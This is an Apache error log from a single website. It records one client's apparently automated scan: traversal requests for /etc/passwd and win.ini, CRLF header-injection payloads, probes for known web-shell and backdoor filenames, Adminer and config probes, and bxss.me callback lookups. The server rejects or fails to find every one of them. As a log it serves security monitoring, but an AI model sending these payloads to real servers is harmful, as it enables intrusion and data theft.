[Wed Jul 07 19:31:35.817372 2021] [http:error] [pid 15215] [client 27.147.202.214:8179] AH02430: Response header 'Location' value of 'https://h3.warframetools.com/\n.example.com' contains invalid characters, aborting request
[Wed Jul 07 19:31:37.772068 2021] [php7:error] [pid 15442] [client 27.147.202.214:8191] script '/var/www/html/h3.warframetools.com/bitrix_server_test.php' not found or unable to stat
[Wed Jul 07 19:31:38.003191 2021] [php7:error] [pid 15288] [client 27.147.202.214:8204] script '/var/www/html/h3.warframetools.com/Adminer.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:38.829750 2021] [php7:error] [pid 15450] [client 27.147.202.214:8202] script '/var/www/html/h3.warframetools.com/ad.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:38.841878 2021] [php7:error] [pid 15451] [client 27.147.202.214:8231] script '/var/www/html/h3.warframetools.com/adminer-4.6.0-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.105232 2021] [php7:error] [pid 15447] [client 27.147.202.214:8214] script '/var/www/html/h3.warframetools.com/adminer-4.3.0-mysql.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.142288 2021] [php7:error] [pid 15448] [client 27.147.202.214:8207] script '/var/www/html/h3.warframetools.com/adminer-4.2.5-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.337535 2021] [php7:error] [pid 15444] [client 27.147.202.214:8206] script '/var/www/html/h3.warframetools.com/adminer-4.2.5.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.402137 2021] [php7:error] [pid 15446] [client 27.147.202.214:8203] script '/var/www/html/h3.warframetools.com/ad.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.412524 2021] [php7:error] [pid 15449] [client 27.147.202.214:8200] script '/var/www/html/h3.warframetools.com/_adminer.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.536874 2021] [core:error] [pid 15436] [client 27.147.202.214:8185] AH00126: Invalid URI in request GET /static/../../../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:31:39.805797 2021] [php7:error] [pid 15456] [client 27.147.202.214:8235] script '/var/www/html/h3.warframetools.com/adminer-4.6.1-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.816285 2021] [php7:error] [pid 15454] [client 27.147.202.214:8201] script '/var/www/html/h3.warframetools.com/adminer.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.820532 2021] [php7:error] [pid 15452] [client 27.147.202.214:8213] script '/var/www/html/h3.warframetools.com/adminer-4.3.0-mysql-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.849396 2021] [php7:error] [pid 15453] [client 27.147.202.214:8219] script '/var/www/html/h3.warframetools.com/adminer-4.4.0.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.860177 2021] [php7:error] [pid 15455] [client 27.147.202.214:8209] script '/var/www/html/h3.warframetools.com/adminer-4.2.5-mysql.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.953875 2021] [php7:error] [pid 15457] [client 27.147.202.214:8224] script '/var/www/html/h3.warframetools.com/adminer-4.5.0-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:39.983056 2021] [php7:error] [pid 15458] [client 27.147.202.214:8239] script '/var/www/html/h3.warframetools.com/adminer-4.6.2-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:40.103822 2021] [php7:error] [pid 15462] [client 27.147.202.214:8215] script '/var/www/html/h3.warframetools.com/adminer-4.3.1.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:40.201399 2021] [php7:error] [pid 15436] [client 27.147.202.214:8216] script '/var/www/html/h3.warframetools.com/adminer-4.3.1-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:40.229597 2021] [php7:error] [pid 15467] [client 27.147.202.214:8208] script '/var/www/html/h3.warframetools.com/adminer-4.2.5-mysql-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:40.454758 2021] [php7:error] [pid 15461] [client 27.147.202.214:8211] script '/var/www/html/h3.warframetools.com/adminer-4.3.0.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:40.479968 2021] [php7:error] [pid 15445] [client 27.147.202.214:8217] script '/var/www/html/h3.warframetools.com/adminer-4.3.1-mysql-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:40.542122 2021] [php7:error] [pid 15466] [client 27.147.202.214:8222] script '/var/www/html/h3.warframetools.com/adminer-4.4.0-mysql.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:40.743920 2021] [php7:error] [pid 15215] [client 27.147.202.214:8180] script '/var/www/html/h3.warframetools.com/opcache.php' not found or unable to stat
[Wed Jul 07 19:31:40.747239 2021] [php7:error] [pid 15464] [client 27.147.202.214:8218] script '/var/www/html/h3.warframetools.com/adminer-4.3.1-mysql.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.016610 2021] [php7:error] [pid 15122] [client 27.147.202.214:8172] script '/var/www/html/h3.warframetools.com/opcache.php' not found or unable to stat
[Wed Jul 07 19:31:41.041703 2021] [php7:error] [pid 15460] [client 27.147.202.214:8212] script '/var/www/html/h3.warframetools.com/adminer-4.3.0-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.208103 2021] [php7:error] [pid 15470] [client 27.147.202.214:8225] script '/var/www/html/h3.warframetools.com/adminer-4.5.0-mysql-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.209347 2021] [php7:error] [pid 15472] [client 27.147.202.214:8237] script '/var/www/html/h3.warframetools.com/adminer-4.6.1-mysql.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.232549 2021] [php7:error] [pid 15471] [client 27.147.202.214:8236] script '/var/www/html/h3.warframetools.com/adminer-4.6.1-mysql-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.236105 2021] [php7:error] [pid 15465] [client 27.147.202.214:8233] script '/var/www/html/h3.warframetools.com/adminer-4.6.0-mysql.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.274263 2021] [php7:error] [pid 15474] [client 27.147.202.214:8223] script '/var/www/html/h3.warframetools.com/adminer-4.5.0.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.342572 2021] [php7:error] [pid 15476] [client 27.147.202.214:8241] script '/var/www/html/h3.warframetools.com/adminer-4.6.2-mysql-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.350158 2021] [php7:error] [pid 15475] [client 27.147.202.214:8234] script '/var/www/html/h3.warframetools.com/adminer-4.6.1.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.365434 2021] [php7:error] [pid 15477] [client 27.147.202.214:8243] script '/var/www/html/h3.warframetools.com/adminer-4.6.2-mysql.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.608973 2021] [php7:error] [pid 14375] [client 27.147.202.214:8228] script '/var/www/html/h3.warframetools.com/adminer-4.6.0.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.876612 2021] [php7:error] [pid 15479] [client 27.147.202.214:8221] script '/var/www/html/h3.warframetools.com/adminer-4.4.0-mysql-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:41.882622 2021] [php7:error] [pid 15469] [client 27.147.202.214:8232] script '/var/www/html/h3.warframetools.com/adminer-4.6.0-mysql-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:42.521151 2021] [core:error] [pid 15440] [client 27.147.202.214:8194] AH00126: Invalid URI in request GET /%2e%2e/index.js HTTP/1.1
[Wed Jul 07 19:31:42.735845 2021] [php7:error] [pid 15463] [client 27.147.202.214:8226] script '/var/www/html/h3.warframetools.com/adminer-4.5.0-mysql.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:42.846132 2021] [core:error] [pid 15215] [client 27.147.202.214:8180] AH00126: Invalid URI in request GET /%2e%2e/debug.js HTTP/1.1
[Wed Jul 07 19:31:43.145995 2021] [core:error] [pid 15441] [client 27.147.202.214:8193] AH00126: Invalid URI in request GET /%2e%2e/release.js HTTP/1.1
[Wed Jul 07 19:31:44.049768 2021] [php7:error] [pid 15478] [client 27.147.202.214:8238] script '/var/www/html/h3.warframetools.com/adminer-4.6.2.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:44.680215 2021] [php7:error] [pid 14478] [client 27.147.202.214:8220] script '/var/www/html/h3.warframetools.com/adminer-4.4.0-en.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:45.656122 2021] [authz_core:error] [pid 15127] [client 27.147.202.214:8183] AH01630: client denied by server configuration: /var/www/html/h3.warframetools.com/server-status
[Wed Jul 07 19:31:46.801001 2021] [php7:error] [pid 15463] [client 27.147.202.214:8226] script '/var/www/html/h3.warframetools.com/coredumpcheck.php' not found or unable to stat
[Wed Jul 07 19:31:47.179452 2021] [http:error] [pid 15301] [client 27.147.202.214:8184] AH02430: Response header 'Location' value of 'https://h3.warframetools.com/\r\nheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 19:31:48.374473 2021] [http:error] [pid 14347] [client 27.147.202.214:4283] AH02430: Response header 'Location' value of 'https://h3.warframetools.com/\r\theadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 19:31:49.011657 2021] [http:error] [pid 15455] [client 27.147.202.214:4354] AH02430: Response header 'Location' value of 'https://h3.warframetools.com/\nheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 19:31:49.212025 2021] [php7:error] [pid 15453] [client 27.147.202.214:4347] script '/var/www/html/h3.warframetools.com/loader-wizard.php' not found or unable to stat
[Wed Jul 07 19:31:49.652674 2021] [http:error] [pid 15492] [client 27.147.202.214:4464] AH02430: Response header 'Location' value of 'https://h3.warframetools.com/\rheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 19:31:50.262874 2021] [http:error] [pid 15461] [client 27.147.202.214:8193] AH02430: Response header 'Location' value of 'https://h3.warframetools.com/~\r\nheadername: headervalue' contains invalid characters, aborting request
[Wed Jul 07 19:31:50.602563 2021] [core:error] [pid 14478] [client 27.147.202.214:8220] AH00126: Invalid URI in request GET @uri1.hit24048634682a84f.group.bxss.me/ HTTP/1.1
[Wed Jul 07 19:31:51.872609 2021] [core:error] [pid 15482] [client 27.147.202.214:8342] AH00126: Invalid URI in request GET .uri3.hit24048634682a84f.group.bxss.me/ HTTP/1.1
[Wed Jul 07 19:31:52.203712 2021] [authz_core:error] [pid 15478] [client 27.147.202.214:8238] AH01630: client denied by server configuration: /var/www/html/h3.warframetools.com/server-status
[Wed Jul 07 19:31:52.796995 2021] [core:error] [pid 15302] [client 27.147.202.214:8414] AH00126: Invalid URI in request GET @bxss.me/rpb.png HTTP/1.1
[Wed Jul 07 19:31:53.632812 2021] [core:error] [pid 15479] [client 27.147.202.214:8221] AH00126: Invalid URI in request GET /sdk/../../../../../../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:31:55.075591 2021] [php7:error] [pid 15429] [client 27.147.202.214:7521] script '/var/www/html/h3.warframetools.com/r2dw6h5vguo3.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:31:55.174392 2021] [core:error] [pid 14359] [client 27.147.202.214:8351] AH00126: Invalid URI in request GET /../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:32:07.510692 2021] [authz_core:error] [pid 15445] [client 27.147.202.214:7202] AH01630: client denied by server configuration: /var/www/html/h3.warframetools.com/.htaccess
[Wed Jul 07 19:32:08.727480 2021] [php7:error] [pid 15454] [client 27.147.202.214:7542] script '/var/www/html/h3.warframetools.com/r57shell.php' not found or unable to stat
[Wed Jul 07 19:32:08.961611 2021] [php7:error] [pid 15299] [client 27.147.202.214:7215] script '/var/www/html/h3.warframetools.com/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:32:09.048849 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/r57.php' not found or unable to stat
[Wed Jul 07 19:32:09.373010 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/r58.php' not found or unable to stat
[Wed Jul 07 19:32:09.600166 2021] [php7:error] [pid 15442] [client 27.147.202.214:8191] script '/var/www/html/h3.warframetools.com/pi.php' not found or unable to stat
[Wed Jul 07 19:32:09.675475 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/c99shell.php' not found or unable to stat
[Wed Jul 07 19:32:09.998310 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/c99.php' not found or unable to stat
[Wed Jul 07 19:32:10.238465 2021] [php7:error] [pid 15442] [client 27.147.202.214:8191] script '/var/www/html/h3.warframetools.com/php.php' not found or unable to stat
[Wed Jul 07 19:32:10.318806 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/nstview.php' not found or unable to stat
[Wed Jul 07 19:32:10.560259 2021] [php7:error] [pid 15442] [client 27.147.202.214:8191] script '/var/www/html/h3.warframetools.com/i.php' not found or unable to stat
[Wed Jul 07 19:32:10.619247 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/nst.php' not found or unable to stat
[Wed Jul 07 19:32:10.890334 2021] [php7:error] [pid 15442] [client 27.147.202.214:8191] script '/var/www/html/h3.warframetools.com/test.php' not found or unable to stat
[Wed Jul 07 19:32:10.932177 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/rst.php' not found or unable to stat
[Wed Jul 07 19:32:11.204671 2021] [php7:error] [pid 15495] [client 27.147.202.214:7217] script '/var/www/html/h3.warframetools.com/apc.php' not found or unable to stat
[Wed Jul 07 19:32:11.227683 2021] [php7:error] [pid 15442] [client 27.147.202.214:8191] script '/var/www/html/h3.warframetools.com/temp.php' not found or unable to stat
[Wed Jul 07 19:32:11.251061 2021] [php7:error] [pid 15309] [client 27.147.202.214:7216] script '/var/www/html/h3.warframetools.com/webadmin.php' not found or unable to stat
[Wed Jul 07 19:32:11.258123 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/r57eng.php' not found or unable to stat
[Wed Jul 07 19:32:11.549646 2021] [php7:error] [pid 15442] [client 27.147.202.214:8191] script '/var/www/html/h3.warframetools.com/info.php' not found or unable to stat
[Wed Jul 07 19:32:11.568518 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/shell.php' not found or unable to stat
[Wed Jul 07 19:32:11.884866 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/dra.php' not found or unable to stat
[Wed Jul 07 19:32:12.203272 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/r.php' not found or unable to stat
[Wed Jul 07 19:32:12.526458 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/lol.php' not found or unable to stat
[Wed Jul 07 19:32:12.856307 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/zehir.php' not found or unable to stat
[Wed Jul 07 19:32:13.141221 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:32:13.448051 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:32:13.763012 2021] [php7:error] [pid 15127] [client 27.147.202.214:8183] script '/var/www/html/h3.warframetools.com/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:32:26.024436 2021] [core:error] [pid 15476] [client 27.147.202.214:2077] AH00126: Invalid URI in request GET /css/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:32:26.883391 2021] [php7:error] [pid 15494] [client 27.147.202.214:2070] script '/var/www/html/h3.warframetools.com/js/tq95rgtrgria.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:32:27.223846 2021] [core:error] [pid 15500] [client 27.147.202.214:2078] AH00126: Invalid URI in request GET /js/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:32:27.227459 2021] [php7:error] [pid 15494] [client 27.147.202.214:2070] script '/var/www/html/h3.warframetools.com/app_dev.php' not found or unable to stat
[Wed Jul 07 19:32:27.564979 2021] [php7:error] [pid 15260] [client 27.147.202.214:2065] script '/var/www/html/h3.warframetools.com/css/tniozigta0k2.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:32:27.873533 2021] [php7:error] [pid 15494] [client 27.147.202.214:2070] script '/var/www/html/h3.warframetools.com/pNDwUliS.php' not found or unable to stat
[Wed Jul 07 19:32:28.190080 2021] [php7:error] [pid 15494] [client 27.147.202.214:2070] script '/var/www/html/h3.warframetools.com/db.php' not found or unable to stat
[Wed Jul 07 19:32:28.253190 2021] [core:error] [pid 15500] [client 27.147.202.214:2084] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:32:28.414271 2021] [php7:error] [pid 15492] [client 27.147.202.214:2068] script '/var/www/html/h3.warframetools.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:32:28.697386 2021] [authz_core:error] [pid 14408] [client 27.147.202.214:2067] AH01630: client denied by server configuration: /var/www/html/h3.warframetools.com/.htaccess~
[Wed Jul 07 19:32:28.805897 2021] [php7:error] [pid 15476] [client 27.147.202.214:2081] script '/var/www/html/h3.warframetools.com/conf.php' not found or unable to stat
[Wed Jul 07 19:32:29.025440 2021] [authz_core:error] [pid 14408] [client 27.147.202.214:2067] AH01630: client denied by server configuration: /var/www/html/h3.warframetools.com/.htaccess.old
[Wed Jul 07 19:32:29.239925 2021] [core:error] [pid 14857] [client 27.147.202.214:2083] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:32:29.334555 2021] [authz_core:error] [pid 15484] [client 27.147.202.214:2074] AH01630: client denied by server configuration: /var/www/html/h3.warframetools.com/.htaccess.save
[Wed Jul 07 19:32:29.453511 2021] [php7:error] [pid 15451] [client 27.147.202.214:2089] script '/var/www/html/h3.warframetools.com/settings.php' not found or unable to stat
[Wed Jul 07 19:32:29.553900 2021] [php7:error] [pid 15460] [client 27.147.202.214:2079] script '/var/www/html/h3.warframetools.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:32:29.879189 2021] [core:error] [pid 15472] [client 27.147.202.214:2085] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:30.049703 2021] [core:error] [pid 15494] [client 27.147.202.214:2070] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:32:30.103969 2021] [php7:error] [pid 15451] [client 27.147.202.214:2089] script '/var/www/html/h3.warframetools.com/config.php' not found or unable to stat
[Wed Jul 07 19:32:30.704844 2021] [core:error] [pid 15498] [client 27.147.202.214:2071] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:30.727326 2021] [php7:error] [pid 15490] [client 27.147.202.214:2082] script '/var/www/html/h3.warframetools.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:32:30.740910 2021] [core:error] [pid 14408] [client 27.147.202.214:2067] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:30.774793 2021] [php7:error] [pid 15451] [client 27.147.202.214:2089] script '/var/www/html/h3.warframetools.com/config.inc.php' not found or unable to stat
[Wed Jul 07 19:32:31.104118 2021] [php7:error] [pid 15451] [client 27.147.202.214:2089] script '/var/www/html/h3.warframetools.com/localconfig.php' not found or unable to stat
[Wed Jul 07 19:32:31.120240 2021] [php7:error] [pid 15445] [client 27.147.202.214:2075] script '/var/www/html/h3.warframetools.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:32:31.208011 2021] [core:error] [pid 15476] [client 27.147.202.214:2081] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:32:31.693935 2021] [core:error] [pid 15455] [client 27.147.202.214:2066] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:32:31.733002 2021] [php7:error] [pid 15451] [client 27.147.202.214:2089] script '/var/www/html/h3.warframetools.com/configuration.php' not found or unable to stat
[Wed Jul 07 19:32:31.760081 2021] [php7:error] [pid 15445] [client 27.147.202.214:2075] script '/var/www/html/h3.warframetools.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:32:31.990351 2021] [core:error] [pid 15490] [client 27.147.202.214:2082] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:32:32.386498 2021] [php7:error] [pid 15451] [client 27.147.202.214:2089] script '/var/www/html/h3.warframetools.com/settings.inc.php' not found or unable to stat
[Wed Jul 07 19:32:32.394302 2021] [core:error] [pid 15635] [client 27.147.202.214:2090] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:32:32.410198 2021] [php7:error] [pid 15640] [client 27.147.202.214:3604] script '/var/www/html/h3.warframetools.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:32:32.503623 2021] [core:error] [pid 15442] [client 27.147.202.214:2072] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:32.683596 2021] [php7:error] [pid 15451] [client 27.147.202.214:2089] script '/var/www/html/h3.warframetools.com/global.inc.php' not found or unable to stat
[Wed Jul 07 19:32:32.810034 2021] [core:error] [pid 15314] [client 27.147.202.214:2064] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:32:33.030688 2021] [php7:error] [pid 15451] [client 27.147.202.214:2089] script '/var/www/html/h3.warframetools.com/database.php' not found or unable to stat
[Wed Jul 07 19:32:33.062892 2021] [php7:error] [pid 15640] [client 27.147.202.214:3604] script '/var/www/html/h3.warframetools.com/xmlrpc.php' not found or unable to stat
[Wed Jul 07 19:32:33.503083 2021] [core:error] [pid 14785] [client 27.147.202.214:2063] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:32:33.664418 2021] [php7:error] [pid 15451] [client 27.147.202.214:2089] script '/var/www/html/h3.warframetools.com/database.inc.php' not found or unable to stat
[Wed Jul 07 19:32:33.715186 2021] [php7:error] [pid 15640] [client 27.147.202.214:3604] script '/var/www/html/h3.warframetools.com/soap.php' not found or unable to stat
[Wed Jul 07 19:32:33.722789 2021] [core:error] [pid 14359] [client 27.147.202.214:2105] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:32:34.087328 2021] [core:error] [pid 14408] [client 27.147.202.214:13385] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:34.281882 2021] [core:error] [pid 15460] [client 27.147.202.214:2079] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:32:34.382170 2021] [php7:error] [pid 15640] [client 27.147.202.214:3604] script '/var/www/html/h3.warframetools.com/soap.php' not found or unable to stat
[Wed Jul 07 19:32:34.493228 2021] [php7:error] [pid 15308] [client 27.147.202.214:2087] script '/var/www/html/h3.warframetools.com/phpThumb.php' not found or unable to stat
[Wed Jul 07 19:32:34.805430 2021] [core:error] [pid 15476] [client 27.147.202.214:13426] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:34.852124 2021] [php7:error] [pid 15631] [client 27.147.202.214:2069] script '/var/www/html/h3.warframetools.com/js/r57shell.php' not found or unable to stat
[Wed Jul 07 19:32:35.083524 2021] [php7:error] [pid 15640] [client 27.147.202.214:3604] script '/var/www/html/h3.warframetools.com/soap.php' not found or unable to stat
[Wed Jul 07 19:32:35.173558 2021] [php7:error] [pid 15504] [client 27.147.202.214:13331] script '/var/www/html/h3.warframetools.com/js/webadmin.php' not found or unable to stat
[Wed Jul 07 19:32:35.184420 2021] [php7:error] [pid 15631] [client 27.147.202.214:2069] script '/var/www/html/h3.warframetools.com/js/r57.php' not found or unable to stat
[Wed Jul 07 19:32:35.378418 2021] [core:error] [pid 15630] [client 27.147.202.214:2056] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:32:35.520359 2021] [php7:error] [pid 15631] [client 27.147.202.214:2069] script '/var/www/html/h3.warframetools.com/js/r58.php' not found or unable to stat
[Wed Jul 07 19:32:35.810089 2021] [core:error] [pid 14944] [client 27.147.202.214:2061] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:32:35.814477 2021] [php7:error] [pid 15631] [client 27.147.202.214:2069] script '/var/www/html/h3.warframetools.com/js/c99shell.php' not found or unable to stat
[Wed Jul 07 19:32:35.814661 2021] [php7:error] [pid 15640] [client 27.147.202.214:3604] script '/var/www/html/h3.warframetools.com/soap.php' not found or unable to stat
[Wed Jul 07 19:32:36.011076 2021] [core:error] [pid 15299] [client 27.147.202.214:2076] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:32:36.105918 2021] [php7:error] [pid 15302] [client 27.147.202.214:2086] script '/var/www/html/h3.warframetools.com/login.php' not found or unable to stat
[Wed Jul 07 19:32:36.151249 2021] [php7:error] [pid 15631] [client 27.147.202.214:2069] script '/var/www/html/h3.warframetools.com/js/c99.php' not found or unable to stat
[Wed Jul 07 19:32:36.326959 2021] [core:error] [pid 15660] [client 27.147.202.214:13398] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:36.460670 2021] [php7:error] [pid 15631] [client 27.147.202.214:2069] script '/var/www/html/h3.warframetools.com/js/nstview.php' not found or unable to stat
[Wed Jul 07 19:32:36.489081 2021] [php7:error] [pid 15640] [client 27.147.202.214:3604] script '/var/www/html/h3.warframetools.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 19:32:36.783975 2021] [php7:error] [pid 15631] [client 27.147.202.214:2069] script '/var/www/html/h3.warframetools.com/js/nst.php' not found or unable to stat
[Wed Jul 07 19:32:37.101715 2021] [php7:error] [pid 15461] [client 27.147.202.214:2080] script '/var/www/html/h3.warframetools.com/js/rst.php' not found or unable to stat
[Wed Jul 07 19:32:37.125289 2021] [php7:error] [pid 15640] [client 27.147.202.214:3604] script '/var/www/html/h3.warframetools.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 19:32:37.241397 2021] [core:error] [pid 15664] [client 27.147.202.214:13435] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:37.388156 2021] [php7:error] [pid 15308] [client 27.147.202.214:2087] script '/var/www/html/h3.warframetools.com/js/r57eng.php' not found or unable to stat
[Wed Jul 07 19:32:37.397631 2021] [core:error] [pid 15631] [client 27.147.202.214:2069] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:32:37.682051 2021] [php7:error] [pid 15308] [client 27.147.202.214:2087] script '/var/www/html/h3.warframetools.com/js/shell.php' not found or unable to stat
[Wed Jul 07 19:32:37.704002 2021] [core:error] [pid 15450] [client 27.147.202.214:13322] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:32:37.759935 2021] [php7:error] [pid 15643] [client 27.147.202.214:3603] script '/var/www/html/h3.warframetools.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 19:32:37.980295 2021] [php7:error] [pid 15308] [client 27.147.202.214:2087] script '/var/www/html/h3.warframetools.com/js/dra.php' not found or unable to stat
